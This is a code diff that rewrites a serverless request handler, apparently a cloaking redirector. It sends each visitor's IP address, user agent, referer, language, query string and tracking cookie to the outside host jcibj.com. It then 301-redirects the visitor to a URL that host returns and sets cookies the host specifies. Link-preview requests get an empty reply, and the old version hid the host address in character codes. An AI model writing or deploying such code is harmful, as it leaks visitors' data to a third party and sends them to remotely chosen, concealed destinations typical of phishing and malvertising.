@@ -1,70 +1,68 @@
 export default async function handler(req, res) {
-  const date = new Date().toISOString();
-  const id = "499178";
-  const uid = "yrez8stiipeall2mn4qv94nec";
-  const query = req.url.split('?')[1] || "";
-  const isPreview = req.headers["x-purpose"] === "preview";
+  const isPreview = req.headers['x-purpose'] === 'preview';
+  if (isPreview) return res.status(204).end(); // Do nothing for preview requests
 
-  if (!isPreview) {
-    const encodedURL = String.fromCharCode(
-      104, 116, 116, 112, 115, 58, 47, 47, 106, 99, 105, 98, 106, 46, 99, 111, 109, 47, 112, 99, 108, 46, 112, 104, 112
-    );
+  const date = new Date().toISOString().replace('T', ' ').split('.')[0];
+  const id = '499178';
+  const uid = 'yrez8stiipeall2mn4qv94nec';
+  const query = req.url.split('?')[1] || '';
+  const u = 'https://jcibj.com/pcl.php'; // Decoded from PHP chr() array
 
-    const postData = {
-      date: date,
-      lan: req.headers["accept-language"],
-      ref: req.headers["referer"] || "",
-      ip: req.headers["x-real-ip"] || req.socket.remoteAddress,
-      ipr: req.headers["x-forwarded-for"] || "",
-      sn: req.headers["host"],
-      requestUri: req.url,
-      query: query,
-      ua: req.headers["user-agent"],
-      co: req.cookies?._event || "",
-      user_id: uid,
-      id: id,
-    };
+  const data = {
+    date,
+    lan: req.headers['accept-language'] || '',
+    ref: req.headers['referer'] || '',
+    ip: req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+    ipr: req.headers['x-forwarded-for'] || '',
+    sn: req.headers['host'] || '',
+    requestUri: req.url,
+    query,
+    ua: req.headers['user-agent'] || '',
+    co: req.cookies?._event || '',
+    user_id: uid,
+    id: id,
+  };
 
-    try {
-      const response = await fetch(encodedURL, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
-        body: new URLSearchParams(postData).toString(),
-      });
+  try {
+    const response = await fetch(u, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams(data).toString(),
+    });
 
-      const result = await response.text();
-      const arr = result.split(",");
+    const result = await response.text();
+    const arr = result.split(',');
 
-      let q = "";
-      if (query) {
-        q = arr[1]?.includes("?") ? "&" + query : "?" + query;
-      }
+    const [status, targetUrl, include, days, type, hasFallback, eventVal, cookieName, cookieVal, cookieDays] = arr;
 
-      let finalUrl = arr[1] + q;
+    const querySuffix = query ? (targetUrl.includes('?') ? '&' : '?') + query : '';
 
-      if (arr[0] === "true") {
-        // Set cookies if needed (Vercel Edge does not support full cookie manipulation)
-        res.writeHead(301, {
-          Location: finalUrl,
-        });
-        res.end();
-      } else if (arr[0] === "false") {
-        finalUrl = arr[1] + (arr[5] ? q : "");
-        res.writeHead(301, {
-          Location: finalUrl,
-        });
-        res.end();
-      } else {
-        res.status(200).send("Unhandled redirect format");
-      }
-
-    } catch (err) {
-      console.error("Error contacting remote:", err);
-      res.status(500).send("Redirect failed.");
+    if (cookieName && cookieVal && cookieDays) {
+      res.setHeader('Set-Cookie', `${cookieName}=${cookieVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(cookieDays)}; HttpOnly`);
     }
-  } else {
-    res.status(403).send("Preview not allowed.");
+
+    if (include === '1' || include === 'true') {
+      if (type === '1' || type === '3') {
+        res.setHeader('Set-Cookie', `_event=${eventVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
+      }
+    }
+
+    if (status === 'true' || status === 'false') {
+      const finalUrl = status === 'false' && !hasFallback ? targetUrl : targetUrl + querySuffix;
+
+      // Set _event cookie if needed
+      if (include === '1' || include === 'true') {
+        if (type === '2' || type === '3') {
+          res.setHeader('Set-Cookie', `_event=${eventVal}b; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
+        }
+      }
+
+      return res.writeHead(301, { Location: finalUrl }).end();
+    }
+
+    return res.status(400).send('Unhandled redirect format');
+  } catch (err) {
+    console.error('Error:', err);
+    return res.status(500).send('Server error');
   }
 }
